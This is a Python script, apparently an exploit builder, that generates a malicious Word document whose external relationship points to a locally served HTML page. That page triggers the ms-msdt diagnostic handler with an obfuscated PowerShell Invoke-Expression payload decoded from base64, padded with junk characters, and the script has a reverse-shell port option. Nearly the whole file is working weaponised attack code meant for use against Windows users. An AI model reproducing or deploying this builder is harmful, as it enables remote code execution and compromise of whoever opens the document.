#!/usr/bin/env python3

import argparse
import zipfile
import tempfile
import shutil
import os
import netifaces
import ipaddress
import random
import base64
import http.server
import socketserver
import string
import socket
import threading
import webbrowser

parser = argparse.ArgumentParser()

parser.add_argument(
    "--url",
    "-u",
    default="https://example.com",
    help="URL to open in web browser (default: https://example.com)",
)

parser.add_argument(
    "--output",
    "-o",
    default="./shreksPY.doc",
    help="output maldoc file (default: ./shreksPY.doc)",
)

parser.add_argument(
    "--interface",
    "-i",
    default="eth0",
    help="network interface or IP address to host the HTTP server (default: eth0)",
)

parser.add_argument(
    "--port",
    "-p",
    type=int,
    default="8000",
    help="port to serve the HTTP server (default: 8000)",
)

parser.add_argument(
    "--reverse",
    "-r",
    type=int,
    default="0",
    help="port to serve reverse shell on",
)


def main(args):
    try:
        serve_host = ipaddress.IPv4Address(args.interface)
    except ipaddress.AddressValueError:
        try:
            serve_host = netifaces.ifaddresses(args.interface)[netifaces.AF_INET][0]["addr"]
        except ValueError:
            print("[!] error determining http hosting address. Did you provide an interface or IP?")
            exit()

    doc_suffix = "doc"
    staging_dir = os.path.join(tempfile._get_default_tempdir(), next(tempfile._get_candidate_names()))
    doc_path = os.path.join(staging_dir, doc_suffix)
    shutil.copytree(doc_suffix, os.path.join(staging_dir, doc_path))
    print(f"[+] copied staging doc {staging_dir}")

    serve_path = os.path.join(staging_dir, "www")
    os.makedirs(serve_path)

    document_rels_path = os.path.join(staging_dir, doc_suffix, "word", "_rels", "document.xml.rels")

    with open(document_rels_path) as filp:
        external_referral = filp.read()

    external_referral = external_referral.replace(
        "{staged_html}", f"http://{serve_host}:{args.port}/index.html"
    )

    with open(document_rels_path, "w") as filp:
        filp.write(external_referral)

    shutil.make_archive(args.output, "zip", doc_path)
    os.rename(args.output + ".zip", args.output)

    print(f"[+] created maldoc {args.output}")

    # Encode the URL using Base64
    base64_payload = base64.b64encode(args.url.encode("utf-8")).decode("utf-8")

    html_payload = f"""<script>location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{base64_payload}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\""; //"""
    html_payload += "".join([random.choice(string.ascii_lowercase) for _ in range(4096)]) + "\n</script>"

    with open(os.path.join(serve_path, "index.html"), "w") as filp:
        filp.write(html_payload)

    class ReuseTCPServer(socketserver.TCPServer):
        def server_bind(self):
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind(self.server_address)

    class Handler(http.server.SimpleHTTPRequestHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, directory=serve_path, **kwargs)

        def log_message(self, format, *func_args):
            if args.reverse:
                return
            else:
                super().log_message(format, *func_args)

        def log_request(self, format, *func_args):
            if args.reverse:
                return
            else:
                super().log_request(format, *func_args)

    def serve_http():
        with ReuseTCPServer(("", args.port), Handler) as httpd:
            httpd.serve_forever()

    print(f"[+] serving html payload on :{args.port}")
    if args.reverse:
        t = threading.Thread(target=serve_http, args=())
        t.start()
        print(f"[+] starting web browser and opening URL: {args.url}")
        webbrowser.open(args.url)

    else:
        serve_http()


if __name__ == "__main__":
    main(parser.parse_args())
